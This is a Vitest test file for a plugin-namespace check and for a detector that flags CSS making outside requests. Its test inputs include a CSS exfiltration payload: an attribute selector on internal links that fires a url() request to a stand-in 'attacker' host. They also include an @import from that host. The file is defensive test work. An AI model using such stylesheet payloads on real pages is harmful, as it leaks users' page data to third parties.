import { describe, expect, it } from "vitest";
import { NAMESPACES } from "@/lib/locales";
import { cssReachesOutside, isAppNamespace } from "./pluginNamespace";

describe("isAppNamespace", () => {
  it("names every bundle the app registers", () => {
    for (const ns of NAMESPACES) {
      expect(isAppNamespace(ns), ns).toBe(true);
    }
    expect(isAppNamespace("plugins")).toBe(true);
  });

  it("leaves a plugin's own namespaces alone", () => {
    for (const ns of ["myplugin", "com.x.demo", "com.x.demo.panel", "pluginsx", "Plugins", ""]) {
      expect(isAppNamespace(ns), ns).toBe(false);
    }
  });
});

describe("cssReachesOutside", () => {
  it("flags requests a stylesheet would make", () => {
    for (const css of [
      'a[href^="https://internal"]{background:url(https://attacker/l?a)}',
      "body{background: URL( 'x.png' )}",
      "body{background:image-set('a.png' 1x)}",
      '@import "https://attacker/x.css";',
      "@IMPORT url(x.css);",
    ]) {
      expect(cssReachesOutside(css), css).toBe(true);
    }
  });

  it("passes plain styling through", () => {
    for (const css of [
      "body{color:red}",
      ".x{content:'url'}",
      ".curl{margin:0}",
      ".import-button{display:none}",
    ]) {
      expect(cssReachesOutside(css), css).toBe(false);
    }
  });
});
